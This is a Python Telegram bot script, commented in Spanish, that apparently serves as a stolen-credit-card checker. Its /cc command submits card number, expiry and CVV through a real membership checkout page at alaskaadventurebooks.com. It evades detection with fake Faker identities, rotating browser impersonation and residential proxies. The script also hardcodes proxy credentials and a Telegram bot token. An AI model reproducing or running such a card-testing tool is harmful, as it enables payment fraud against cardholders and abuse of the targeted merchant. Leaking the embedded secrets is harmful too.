import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice

from curl_cffi import requests
from fake_useragent import UserAgent



from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext,Application,ContextTypes
import logging

# Habilitar logging para ver los errores
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
            proxy = "geo.iproyal.com:12321"  # Dirección del proxy
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"  # Autenticación

            # Definir los proxies con autenticación
            proxy = {
                "http": f"http://{proxy_auth}@{proxy}",
                "https": f"http://{proxy_auth}@{proxy}",
            }
            cliente.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']


            

            

            #============[Requests 1]============#
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                # 'Cookie': 'PHPSESSID=e283a63d29551e013e08c80a3dcb6392; pmpro_visit=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-14%2018%3A55%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-03-14%2018%3A55%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Safari%2F537.36; _gid=GA1.2.1164923487.1741978540; _gat=1; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fsubscribe%2F; _ga_1X2QW72TVR=GS1.1.1741978539.1.1.1741978560.0.0.0; _ga=GA1.2.647386945.1741978540',
                'Pragma': 'no-cache',
                'Referer': 'https://www.alaskaadventurebooks.com/subscribe/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            response = cliente.get(
                'https://www.alaskaadventurebooks.com/membership-account/membership-levels/',
                headers=headers,
            )
            #============[Requests 2]============#
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                # 'Cookie': 'PHPSESSID=e283a63d29551e013e08c80a3dcb6392; pmpro_visit=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-14%2018%3A55%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-03-14%2018%3A55%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Safari%2F537.36; _gid=GA1.2.1164923487.1741978540; _ga_1X2QW72TVR=GS1.1.1741978539.1.1.1741978586.0.0.0; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-levels%2F; _ga=GA1.2.647386945.1741978540',
                'Pragma': 'no-cache',
                'Referer': 'https://www.alaskaadventurebooks.com/membership-account/membership-levels/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'pmpro_level': '2',
            }

            response = cliente.get(
                'https://www.alaskaadventurebooks.com/membership-account/membership-checkout/',
                params=params,
                headers=headers,
            )
            #============[Requests 3]============#

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                # 'Cookie': 'PHPSESSID=e283a63d29551e013e08c80a3dcb6392; pmpro_visit=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-03-14%2018%3A55%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-03-14%2018%3A55%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-checkout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Safari%2F537.36; _gid=GA1.2.1164923487.1741978540; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.alaskaadventurebooks.com%2Fmembership-account%2Fmembership-checkout%2F%3Fpmpro_level%3D2; _ga=GA1.2.647386945.1741978540; _ga_1X2QW72TVR=GS1.1.1741978539.1.1.1741978820.0.0.0',
                'Origin': 'https://www.alaskaadventurebooks.com',
                'Pragma': 'no-cache',
                'Referer': 'https://www.alaskaadventurebooks.com/membership-account/membership-checkout/?pmpro_level=2',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'pmpro_level': '2',
            }

            data = {
                'pmpro_level': '2',
                'checkjavascript': '1',
                'username': name+last+str(number),
                'password': 'Saiper123',
                'password2': 'Saiper123',
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'bfirstname': name,
                'blastname': last,
                'baddress1': 'Calle 89A',
                'baddress2': '',
                'bcity': 'Merida',
                'bstate': 'Yucatan',
                'bzipcode': '97970',
                'bcountry': 'MX',
                'bphone': '5512669865',
                'CardType': 'Visa',
                'AccountNumber': cc_number,
                'ExpirationMonth': mes,
                'ExpirationYear': ano_number,
                'CVV': cvv,
                'pmpro_checkout_nonce': '360764fb7f',
                '_wp_http_referer': '/membership-account/membership-checkout/?pmpro_level=2',
                'submit-checkout': '1',
                'javascriptok': '1',
            }

            responseChk = cliente.post(
                'https://www.alaskaadventurebooks.com/membership-account/membership-checkout/',
                params=params,
               
                headers=headers,
                data=data,
            )
            print(responseChk)
            soup = b(responseChk.text, 'html.parser')
            div_element = soup.find('div', id='pmpro_message', class_='pmpro_error')
            print(div_element)
           
        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    
async def cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Verifica si se pasó un argumento (el número de tarjeta)
    if context.args:
        card = context.args[0]
        # Llama a la función ccn_gate con la tarjeta y obtiene la respuesta
        result = ccn_gate(card)
        # Responde con el resultado de la función
        await update.message.reply_text(result)
    else:
        await update.message.reply_text("Por favor, proporciona el número de tarjeta después del comando /cc")

# Configuración del bot
def main():
    # Usa 'Application' en lugar de 'Updater'
    application = Application.builder().token("8100331928:AAGO6_xdpBxx2h4zbjNmx9Sin0QLb9PHhzA").build()

    # Añadir el manejador del comando /cc
    application.add_handler(CommandHandler("cc", cc_command))

    # Comienza el bot
    application.run_polling()

if __name__ == '__main__':
    main()